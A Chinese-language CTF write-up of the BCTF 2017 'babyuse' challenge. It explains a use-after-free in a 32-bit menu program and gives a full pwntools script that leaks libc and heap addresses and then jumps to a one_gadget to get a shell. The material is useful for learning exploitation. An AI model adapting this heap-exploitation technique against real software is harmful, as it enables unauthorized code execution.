---
layout:     post
title:      "2017-04-19-bctf-2017-babyuse-writeup"
subtitle:   "how to heap"
date:       2017-04-19 19:30:00 -0800
author:     "Dafeng"
header-img: "img/post-bg-universe.jpg"
header-mask: 0.3
catalog: true
tags:
    - CTF
    - Heap
    - Pwn
---

## Bctf babyuse

### 简述
32位ELF文件，没有符号表，提供so库

查看程序开启的保护机制：

    $ checksec --file babyuse
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

差不多保护全开，不过对于ctf题目已经习以为常了，不开保护才不正常呢！

### 分析程序
    $ ./babyuse
     _                                         
    |_)_. _ _o _ ._  |  _  _. _| _  /\ ._ _    
    | (_|_>_>|(_)| | |_(/_(_|(_|_> /--\| | |\/
                                            /  

    Menu:
    1. Buy a Gun
    2. Select a Gun
    3. List Guns
    4. Rename a Gun
    5. Use a Gun
    6. Drop a Gun
    7. Exit

通过IDA反汇编分析可以找到程序，在select a gun 之后， 然后use a gun，但是在use a gun时获取gun struct指针后没有进行判断。如果我们在select a gun之后Drop a gun, 我们再去使用触发了UAF漏洞，而在Use a gun 里有一个打印函数，打印gun’s name,如果访问的是已经被释放的chunk，可以泄露chunk结构里面的内容。

### 利用步骤
> 不详细介绍原理，详细介绍请参考 [Useful skills for CTF #堆利用](https://stfpeak.github.io/2017/04/12/ctf-base/)

1. 泄露libc地址，买三把抢(名字大小为64)，然后选择第0把，删除第0把，再使用第0把，然后就可以泄露libc中unsorted bin 的地址，从而确定libc基址；
2. 选择第1把，再删除第1把，再使用第一把就可以泄露上一步骤free的smallbin的地址；
3. 通过分析可知： Use a gun调用的方法是通过  *(*ptr)的方式查找函数地址，我们知道只要把最后的指针指向libc中的[one gadget](https://github.com/david942j/one_gadget)地址就可以拿到shell；
4. 直接改写堆不可以成功，思路是通过改写一个堆块，将内容指向堆上的另一个地址，这样的话通过两层指针的寻址可以跳转到我们希望跳转的地址。
5. 通过选择1块，然后删除两块，会在fastbin中存在两个fastbin，然后buy a gun这样的话，令被选择的块为内容块，填充器内容，便可实现跳转。


### Exploit
``` python
#! /usr/bin/python
from pwn import *
context.log_level = 'debug'

def buy(type, len):
  p.recvuntil('7. Exit\n')
  p.sendline('1')
  p.recvuntil('2. QBZ95\n')
  p.sendline(str(type))
  p.recvuntil("name")
  p.sendline(str(len))
  p.recvuntil("Input name:\n")
  p.sendline("a" * len)

def buy2(type, len, payload):
  p.recvuntil('7. Exit\n')
  p.sendline('1')
  p.recvuntil('2. QBZ95\n')
  p.sendline(str(type))
  p.recvuntil("name")
  p.sendline(str(len))
  p.recvuntil("Input name:\n")
  p.sendline(payload)

def select(id):
  p.recvuntil('7. Exit\n')
  p.sendline('2')
  p.recvuntil('Select a gun')
  p.sendline(str(id))

def list():
  p.recvuntil('7. Exit\n')
  p.sendline('3')

def rename(id,lenth,name):
  p.recvuntil('7. Exit')
  p.sendline('4')
  p.recvuntil('to rename:\n')
  p.sendline(str(id))
  p.recvuntil('name')
  p.sendline(str(lenth))
  p.recvuntil('Input name:\n')
  p.sendline(name)

def use():
  p.recvuntil('7. Exit\n')
  p.sendline('5')
  #p.recvuntil('4. Main menu\n')
  #p.sendline(str(type))

def use2(type):
  p.recvuntil('7. Exit\n')
  p.sendline('5')
  p.recvuntil('4. Main menu\n')
  p.sendline(str(type))

def delete(id):
  p.recvuntil('7. Exit\n')
  p.sendline('6')
  p.recvuntil('to delete:\n')
  p.sendline(str(id))

if __name__ == '__main__':
    print "exp start..."
    # p = remote('202.112.51.247', 3456)
    p = process('./babyuse')

    #leak libc
    buy(1, 64)
    buy(1, 64)
    buy(1, 64)
    select(0)
    delete(0)
    use()
    p.recvuntil("Select gun ")
    lib_leak = u32(p.recv(4))
    print hex(lib_leak)
    print proc.pidof(p)
    # the one gadget offset in libc is 0x3ac69
    exec_addr = lib_leak - 0x1b27b0 + 0x3ac69
    print hex(exec_addr)
    p.sendline("4")

    #leak heap addr
    select(1)
    delete(1)
    use()
    p.recvuntil("Select gun ")
    heap_leak = u32(p.recv(4))
    print hex(heap_leak)
    p.sendline("4")

    buy(1, 64)
    buy(1, 64)

    rename(1, 64, p32(exec_addr) + p32(exec_addr) + p32(exec_addr))
    select(1)
    delete(1)
    delete(0)

    buy2(1, 15, p32(heap_leak + 0x110) + p32(heap_leak + 0x110))
    use2(1)
    p.interactive()
    p.close()

```

PS: [BCTF 2017 - PoisonousMilk](http://uaf.io/exploitation/2017/04/17/BCTF-2017-PoisonousMilk.html)

鉴于这题大神已经分析的非常好了，这里就不用赘述了。
